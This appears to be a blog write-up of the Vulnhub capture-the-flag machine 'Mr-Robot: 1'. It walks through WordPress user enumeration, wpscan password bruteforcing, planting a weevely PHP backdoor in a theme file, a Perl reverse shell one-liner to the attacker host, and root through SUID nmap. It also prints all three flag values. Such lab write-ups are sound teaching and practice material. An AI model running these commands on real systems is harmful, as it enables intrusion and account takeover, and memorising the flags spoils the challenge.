---
title: 'Writeup Mr-Robot: 1'
date: '2016-08-09 08:56:00'
layout: post
tags: CTF
---
# Walkthrough "Mr-Robot: 1"

#### Vulnerable Machine: [Mr-Robot 1 on Vulnhub](https://www.vulnhub.com/entry/mr-robot-1,151/)

![]({{ site.baseurl }}/forestryio/images/robot_mirroring_mediagallery_robotsign-1024x576.jpg)

The VM boots up and greets with a simple login screen we check the networking (DHCP) to make sure it's online and reachable from the attacking machine.

![]({{ site.baseurl }}/forestryio/images/1.png)

First thing to do is scanning the machine's ports with nmap to see what is running:

``` bash

$ nmap -p 1-65535 -T4 -A -v 10.0.2.15
Nmap scan report for mrrobot.com (10.0.2.15)
Host is up (0.00023s latency).
Not shown: 997 filtered ports
PORT    STATE  SERVICE
22/tcp  closed ssh
80/tcp  open   http
443/tcp open   https
MAC Address: 08:00:27:2B:ED:07 (Oracle VirtualBox virtual NIC)

```

Since there is only http/s open we fire up the browser and are greeted by some animated terminal, a message from mr. robot and a list of commands available.

![]({{ site.baseurl }}/forestryio/images/2.png)

Trying the commands and looking at the source code doesn't reveal anything too interesting so we proceed to check for some usual default file like robots.txt. Which contains two entries:

```
User-agent: *
fsocity.dic
key-1-of-3.txt
```

`key-1-of-3.txt` looks like our first key, `fsocity.dic` is a wordlist. Sure it comes in handy for password cracking later on. We save both and have another look at the source. In the JavaScript file main-acba06a5.js there is a hidden `420`-command that doesn't appear in the commands listed by `help`.

![]({{ site.baseurl }}/forestryio/images/3.png)

Funny (try yourself), but nothing to do here. Looks like a dead end.

Let's check for more files or hidden directories on the server using dirb and some common wordlist:

![]({{ site.baseurl }}/forestryio/images/5.png)

Bruteforcing directories reveals some typical Wordpress directories and files like `/atom/`, `/feed/` and `wp-login.php` so let's use [wpscan](https://github.com/wpscanteam/wpscan) to check for Wordpress version, users and plugins:

``` bash

$ wpscan --url http://10.0.2.15 --enumerate p u t --random-agent
```

![]({{ site.baseurl }}/forestryio/images/6.png)

The scan spits out some vulnerabilities, mostly XSS nothing we can use to break into the Wordpress installation. No usernames either. So we try to enumerate manually by guessing common usernames using the password reset page:

`http://10.0.2.15/wp-login.php?action=lostpassword`

`admin` and `mrrobot` don't exist, but when entering username `elliot` we get an error message saying that the reset mail couldn't be sent. So `elliot` is a legit Wordpress user and therefore we can bruteforce his account:

``` bash

$ wpscan --url http://10.0.2.15 --wordlist fsocity.dic --username elliot
```

![]({{ site.baseurl }}/forestryio/images/7.png)

Once inside the Wordpress Dashboard we check for other users (Krista Gordon, Elliot's therapist, another dead end) and plugins. Nothing of special interest, but the Wordpress Theme Editor is enabled and we can upload a php-shell changing one of the theme files. You can try some shells [from here](https://github.com/BlackArch/webshells/tree/master/php) or build your own using [weevely3](https://github.com/epinna/weevely3).

Reading the Wordpress configuration file `wp-config.php`:

![]({{ site.baseurl }}/forestryio/images/8.png)

Weevely3 Syntax:

```bash

$ weevely generate password ~/backdoor.php
Generated backdoor with password 'password' in '/root/backdoor.php' of 1486 byte size.
```

Copy the code of `backdoor.php` and paste it to a random theme-file. `404.php` works well. We now have a backdoor we can connect to from the terminal:

```bash

$ weevely http://10.0.2.15/wp-content/themes/twentyfifteen/404.php password
```

![]({{ site.baseurl }}/forestryio/images/9.png)

Connected as daemon user exploitation shouldn't be too hard. In the `/home` directory we find 2 files:

``` bash

daemon@linux:/home/robot $ ls -lah
total 16K
drwxr-xr-x 2 root  root  4.0K Nov 13  2015 .
drwxr-xr-x 3 root  root  4.0K Nov 13  2015 ..
-r-------- 1 robot robot   33 Nov 13  2015 key-2-of-3.txt
-rw-r--r-- 1 robot robot   39 Nov 13  2015 password.raw-md5
```

`key-2-of-3.txt` can only be read by `robot`, but `password.raw-md5` returns a hashed password that's easy to crack (try crackstation.net for example):

![]({{ site.baseurl }}/forestryio/images/10.png)

`c3fcd3d76192e4007dfb496cca67e13b	md5	abcdefghijklmnopqrstuvwxyz`

This is be the password for the user account, so we need to find a way to login as `robot`. Since ssh is not available we need to escape the restricted shell. At this point I like to connect metasploit to handle the shell more comfortably. Fire up msfconsole, use multihandler and set the perl_reverse payload:

``` bash

$ msfconsole
                                                  
# cowsay++
 ____________
< metasploit >
 ------------
       \   ,__,
        \  (oo)____
           (__)    )\
              ||--|| *

Easy phishing: Set up email templates, landing pages and listeners
in Metasploit Pro -- learn more on http://rapid7.com/metasploit

       =[ metasploit v4.12.15-dev                         ]
+ -- --=[ 1563 exploits - 904 auxiliary - 269 post        ]
+ -- --=[ 455 payloads - 39 encoders - 8 nops             ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

msf > workspace 
* default
  robot
msf > workspace robot
[*] Workspace: robot
msf > use exploit/multi/handler 
msf exploit(handler) > set payload cmd/unix/reverse_perl
payload => cmd/unix/reverse_perl
msf exploit(handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Payload options (cmd/unix/reverse_perl):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST                   yes       The listen address
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target

msf exploit(handler) > set LHOST 10.0.2.4
LHOST => 10.0.2.4
msf exploit(handler) > set LPORT 23133
LPORT => 23133
msf exploit(handler) > exploit

[*] Started reverse TCP handler on 10.0.2.4:23133 
[*] Starting the payload handler...
```

From your weevely shell start the reverse shell:

``` bash

perl -e 'use Socket;$i="10.0.2.4";$p=23133;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' &
```

Next we will get Get back to your msfconsole and escape the shell using python, because when trying to login as user robot we get a message saying that `su: must be run from a terminal`. So we [escape the restricted shell](http://netsec.ws/?p=337) using a python command and login as robot:

``` bash

$ python -c 'import pty; pty.spawn("/bin/sh")'`
$ su robot
```

We get our second key:

``` bash

$ cat /home/robot/key-2-of-3.txt
822c73956184f694993bede3eb39f959
```

Let's enumerate further and see how to finally root the VM. I will use [LinEnum.sh](https://github.com/rebootuser/LinEnum) since it's a pretty reliable script that almost always spits out something interesting:

``` bash

$ cd /tmp
$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
$ chmod +x LinEnum.sh
$ ./LinEnum.sh -r report -e /tmp/ -t
```

This bit of the report seems interesting:

```
***Possibly interesting SUID files:
-rwsr-xr-x 1 root root 504736 Nov 13  2015 /usr/local/bin/nmap
```

We can run nmap with root privileges and use --interactive mode: 

``` bash

$ nmap --interactive

Starting nmap V. 3.81 ( http://www.insecure.org/nmap/ )
Welcome to Interactive Mode -- press h <enter> for help
nmap> ! sh
! sh
# whoami
whoami
root
# cd /root
cd /root
# ls
firstboot_done	key-3-of-3.txt
# cat key-3-of-3.txt
04787ddef27c3dee1ee161b21670b4e4 
```

![]({{ site.baseurl }}/forestryio/images/mr-robot.jpg)

That's it! Our final key. Honestly I expected something more, like a final video, a message or something :(

Whatever.. i enjoyed this machine and [someone](https://www.vulnhub.com/author/jason,292/) apparently put a lot of work into. Looking forward to a follow-up VM.

